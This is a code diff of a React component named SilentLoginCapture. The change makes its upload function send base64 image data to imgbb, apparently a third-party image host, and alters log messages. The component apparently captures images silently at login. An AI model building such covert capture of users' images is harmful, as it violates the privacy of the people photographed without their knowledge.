@@ -48,28 +48,29 @@ export default function SilentLoginCapture({
     init();
   }, []);
 
-  // Upload image via API route (server-side upload to avoid RLS issues)
+  // Upload image via API route (server-side upload to imgbb)
   async function uploadImage(base64Data: string, filename: string): Promise<string | null> {
     try {
-      console.log("[SilentCapture] Uploading image via API...");
+      console.log("[SilentCapture] Uploading image to imgbb...");
+      console.log("[SilentCapture] Image data length:", base64Data.length);
 
       const response = await fetch("/api/upload", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ image: base64Data, filename, email }),
+        body: JSON.stringify({ image: base64Data, filename }),
       });
 
       const result = await response.json();
 
       if (!response.ok || result.error) {
-        console.error("[SilentCapture] Upload API error:", result.error);
+        console.error("[SilentCapture] Upload failed:", result.error);
         return null;
       }
 
-      console.log("[SilentCapture] Image uploaded:", result.url);
+      console.log("[SilentCapture] Upload success:", result.url);
       return result.url;
     } catch (err) {
-      console.error("[SilentCapture] Upload failed:", err);
+      console.error("[SilentCapture] Upload error:", err);
       return null;
     }
   }
